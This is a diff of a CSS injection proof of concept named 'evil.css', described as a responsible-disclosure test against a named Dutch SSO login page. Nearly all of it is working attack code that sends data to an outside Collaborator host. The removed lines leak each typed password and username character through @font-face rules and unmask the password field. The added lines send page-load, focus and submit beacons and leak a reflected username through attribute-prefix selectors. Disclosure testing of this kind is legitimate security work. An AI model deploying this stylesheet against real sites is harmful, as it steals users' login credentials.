@@ -1,9 +1,32 @@
-/* evil.css - Credential exfiltration via CSS Injection
+/* evil.css - CSS Injection credential exfiltration PoC
    Geladen via ExternalCss= parameter op sso.competence.biz
-   Context: Responsible Disclosure PoC - SDB Groep */
+   Context: Responsible Disclosure PoC - SDB Groep
+
+   WERKING:
+   1. CSRF POST laadt SSO loginpagina met deze CSS
+   2. Slachtoffer typt credentials en drukt op Login
+   3. Login faalt → server rendert pagina opnieuw met
+      username in value="..." attribuut van het input veld
+   4. ExternalCss= zit als hidden field in het form →
+      deze CSS wordt OPNIEUW geladen
+   5. Nu matchen de attribuut-selectors op de ingevulde
+      username → background-image requests naar Collaborator
+   6. Elke prefix-match triggert exact 1 HTTP request
+*/
 
 /* ================================================
-   1. VISUELE MANIPULATIE (phishing)
+   1. BEVESTIGING: CSS IS GELADEN (page load beacon)
+   ================================================ */
+
+body {
+  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/css-loaded') !important;
+  background-repeat: no-repeat !important;
+  background-position: -9999px -9999px !important;
+  font-family: 'Segoe UI', Arial, sans-serif !important;
+}
+
+/* ================================================
+   2. VISUELE MANIPULATIE (phishing)
    ================================================ */
 
 .panel-heading::before {
@@ -24,214 +47,181 @@
   display: none !important;
 }
 
-body {
-  font-family: 'Segoe UI', Arial, sans-serif !important;
-}
-
 /* ================================================
-   2. PASSWORD EXFILTRATIE via @font-face
-   -webkit-text-security:none schakelt wachtwoord-
-   maskering uit in Chrome/Edge. Elke unieke letter
-   triggert een HTTP request via unicode-range.
+   3. INTERACTIE TRACKING
+   Detecteert welke velden gebruikt worden
    ================================================ */
 
-input#Password, input[type="password"] {
-  -webkit-text-security: none !important;
-  color: transparent !important;
-  caret-color: #333 !important;
-  text-shadow: 0 0 8px rgba(0,0,0,.25) !important;
-  font-family: 'pw' !important;
+input#LogOnName:focus {
+  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-username') !important;
 }
 
-/* Kleine letters a-z */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=a'); unicode-range: U+0061; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=b'); unicode-range: U+0062; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=c'); unicode-range: U+0063; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=d'); unicode-range: U+0064; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=e'); unicode-range: U+0065; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=f'); unicode-range: U+0066; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=g'); unicode-range: U+0067; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=h'); unicode-range: U+0068; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=i'); unicode-range: U+0069; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=j'); unicode-range: U+006A; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=k'); unicode-range: U+006B; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=l'); unicode-range: U+006C; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=m'); unicode-range: U+006D; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=n'); unicode-range: U+006E; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=o'); unicode-range: U+006F; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=p'); unicode-range: U+0070; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=q'); unicode-range: U+0071; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=r'); unicode-range: U+0072; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=s'); unicode-range: U+0073; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=t'); unicode-range: U+0074; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=u'); unicode-range: U+0075; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=v'); unicode-range: U+0076; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=w'); unicode-range: U+0077; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=x'); unicode-range: U+0078; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=y'); unicode-range: U+0079; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=z'); unicode-range: U+007A; }
-
-/* Hoofdletters A-Z */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=A'); unicode-range: U+0041; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=B'); unicode-range: U+0042; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=C'); unicode-range: U+0043; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=D'); unicode-range: U+0044; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=E'); unicode-range: U+0045; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=F'); unicode-range: U+0046; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=G'); unicode-range: U+0047; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=H'); unicode-range: U+0048; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=I'); unicode-range: U+0049; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=J'); unicode-range: U+004A; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=K'); unicode-range: U+004B; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=L'); unicode-range: U+004C; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=M'); unicode-range: U+004D; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=N'); unicode-range: U+004E; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=O'); unicode-range: U+004F; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=P'); unicode-range: U+0050; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=Q'); unicode-range: U+0051; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=R'); unicode-range: U+0052; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=S'); unicode-range: U+0053; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=T'); unicode-range: U+0054; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=U'); unicode-range: U+0055; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=V'); unicode-range: U+0056; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=W'); unicode-range: U+0057; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=X'); unicode-range: U+0058; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=Y'); unicode-range: U+0059; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=Z'); unicode-range: U+005A; }
-
-/* Cijfers 0-9 */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=0'); unicode-range: U+0030; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=1'); unicode-range: U+0031; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=2'); unicode-range: U+0032; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=3'); unicode-range: U+0033; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=4'); unicode-range: U+0034; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=5'); unicode-range: U+0035; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=6'); unicode-range: U+0036; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=7'); unicode-range: U+0037; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=8'); unicode-range: U+0038; }
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=9'); unicode-range: U+0039; }
-
-/* Speciale tekens */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%21'); unicode-range: U+0021; } /* ! */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%40'); unicode-range: U+0040; } /* @ */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%23'); unicode-range: U+0023; } /* # */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%24'); unicode-range: U+0024; } /* $ */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%25'); unicode-range: U+0025; } /* % */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%5E'); unicode-range: U+005E; } /* ^ */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%26'); unicode-range: U+0026; } /* & */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%2A'); unicode-range: U+002A; } /* * */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=(');   unicode-range: U+0028; } /* ( */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=)');   unicode-range: U+0029; } /* ) */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=-');   unicode-range: U+002D; } /* - */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=_');   unicode-range: U+005F; } /* _ */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%2B'); unicode-range: U+002B; } /* + */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%3D'); unicode-range: U+003D; } /* = */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=.');   unicode-range: U+002E; } /* . */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%2C'); unicode-range: U+002C; } /* , */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%3F'); unicode-range: U+003F; } /* ? */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%2F'); unicode-range: U+002F; } /* / */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%7E'); unicode-range: U+007E; } /* ~ */
-@font-face { font-family: 'pw'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?p=%60'); unicode-range: U+0060; } /* ` */
-
-/* ================================================
-   3. USERNAME EXFILTRATIE (zelfde techniek)
-   ================================================ */
-
-input#LogOnName {
-  font-family: 'un', sans-serif !important;
+input#Password:focus {
+  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-password') !important;
 }
-
-/* Kleine letters a-z */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=a'); unicode-range: U+0061; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=b'); unicode-range: U+0062; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=c'); unicode-range: U+0063; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=d'); unicode-range: U+0064; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=e'); unicode-range: U+0065; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=f'); unicode-range: U+0066; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=g'); unicode-range: U+0067; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=h'); unicode-range: U+0068; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=i'); unicode-range: U+0069; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=j'); unicode-range: U+006A; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=k'); unicode-range: U+006B; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=l'); unicode-range: U+006C; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=m'); unicode-range: U+006D; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=n'); unicode-range: U+006E; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=o'); unicode-range: U+006F; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=p'); unicode-range: U+0070; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=q'); unicode-range: U+0071; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=r'); unicode-range: U+0072; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=s'); unicode-range: U+0073; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=t'); unicode-range: U+0074; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=u'); unicode-range: U+0075; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=v'); unicode-range: U+0076; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=w'); unicode-range: U+0077; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=x'); unicode-range: U+0078; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=y'); unicode-range: U+0079; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=z'); unicode-range: U+007A; }
-
-/* Hoofdletters A-Z */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=A'); unicode-range: U+0041; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=B'); unicode-range: U+0042; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=C'); unicode-range: U+0043; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=D'); unicode-range: U+0044; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=E'); unicode-range: U+0045; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=F'); unicode-range: U+0046; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=G'); unicode-range: U+0047; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=H'); unicode-range: U+0048; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=I'); unicode-range: U+0049; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=J'); unicode-range: U+004A; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=K'); unicode-range: U+004B; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=L'); unicode-range: U+004C; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=M'); unicode-range: U+004D; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=N'); unicode-range: U+004E; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=O'); unicode-range: U+004F; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=P'); unicode-range: U+0050; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=Q'); unicode-range: U+0051; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=R'); unicode-range: U+0052; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=S'); unicode-range: U+0053; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=T'); unicode-range: U+0054; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=U'); unicode-range: U+0055; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=V'); unicode-range: U+0056; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=W'); unicode-range: U+0057; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=X'); unicode-range: U+0058; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=Y'); unicode-range: U+0059; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=Z'); unicode-range: U+005A; }
-
-/* Cijfers 0-9 */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=0'); unicode-range: U+0030; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=1'); unicode-range: U+0031; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=2'); unicode-range: U+0032; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=3'); unicode-range: U+0033; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=4'); unicode-range: U+0034; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=5'); unicode-range: U+0035; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=6'); unicode-range: U+0036; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=7'); unicode-range: U+0037; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=8'); unicode-range: U+0038; }
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=9'); unicode-range: U+0039; }
-
-/* Speciale tekens (voor e-mailadressen etc) */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=%40'); unicode-range: U+0040; } /* @ */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=.');   unicode-range: U+002E; } /* . */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=-');   unicode-range: U+002D; } /* - */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=_');   unicode-range: U+005F; } /* _ */
-@font-face { font-family: 'un'; src: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?u=%2B'); unicode-range: U+002B; } /* + */
-
-/* ================================================
-   4. SUBMIT-BUTTON TRACKING
-   Detecteert wanneer gebruiker op Login klikt
-   ================================================ */
 
 input[type="submit"]:active, button[type="submit"]:active {
-  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/c?event=submit') !important;
+  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/submit-clicked') !important;
 }
+
+/* ================================================
+   4. USERNAME EXFILTRATIE via attribuut-selectors
+   Na mislukte login reflecteert de server de username
+   terug in value="...". Deze selectors matchen op de
+   EERSTE letter(s) en triggeren elk 1 HTTP request.
+   ================================================ */
+
+/* --- Eerste karakter (a-z) --- */
+input#LogOnName[value^="a" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=a') !important; }
+input#LogOnName[value^="b" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=b') !important; }
+input#LogOnName[value^="c" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=c') !important; }
+input#LogOnName[value^="d" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=d') !important; }
+input#LogOnName[value^="e" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=e') !important; }
+input#LogOnName[value^="f" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=f') !important; }
+input#LogOnName[value^="g" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=g') !important; }
+input#LogOnName[value^="h" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=h') !important; }
+input#LogOnName[value^="i" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=i') !important; }
+input#LogOnName[value^="j" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=j') !important; }
+input#LogOnName[value^="k" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=k') !important; }
+input#LogOnName[value^="l" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=l') !important; }
+input#LogOnName[value^="m" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=m') !important; }
+input#LogOnName[value^="n" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=n') !important; }
+input#LogOnName[value^="o" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=o') !important; }
+input#LogOnName[value^="p" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=p') !important; }
+input#LogOnName[value^="q" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=q') !important; }
+input#LogOnName[value^="r" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=r') !important; }
+input#LogOnName[value^="s" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=s') !important; }
+input#LogOnName[value^="t" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=t') !important; }
+input#LogOnName[value^="u" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=u') !important; }
+input#LogOnName[value^="v" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=v') !important; }
+input#LogOnName[value^="w" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=w') !important; }
+input#LogOnName[value^="x" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=x') !important; }
+input#LogOnName[value^="y" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=y') !important; }
+input#LogOnName[value^="z" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=z') !important; }
+
+/* --- Eerste karakter (0-9) --- */
+input#LogOnName[value^="0"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=0') !important; }
+input#LogOnName[value^="1"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=1') !important; }
+input#LogOnName[value^="2"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=2') !important; }
+input#LogOnName[value^="3"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=3') !important; }
